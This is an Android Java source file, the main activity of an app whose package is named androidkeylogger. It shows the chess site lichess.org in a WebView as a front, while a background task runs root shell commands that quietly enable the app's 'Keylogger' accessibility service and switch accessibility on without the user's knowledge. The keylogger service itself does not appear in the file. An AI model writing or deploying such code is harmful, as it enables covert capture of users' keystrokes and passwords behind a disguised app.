package com.bshu2.androidkeylogger;

import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;

import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    private WebView webView;  // Define WebView

    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            enableAccessibility();
            return null;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("MainActivity", "onCreate");

        webView = findViewById(R.id.webView); // Initialize WebView
        setupWebView();

        (new Startup()).execute();
    }

    private void setupWebView() {
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://lichess.org/");
    }

    void enableAccessibility() {
        Log.d("MainActivity", "enableAccessibility");
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("settings put secure enabled_accessibility_services com.bshu2.androidkeylogger/com.bshu2.androidkeylogger.Keylogger\n");
            os.flush();
            os.writeBytes("settings put secure accessibility_enabled 1\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
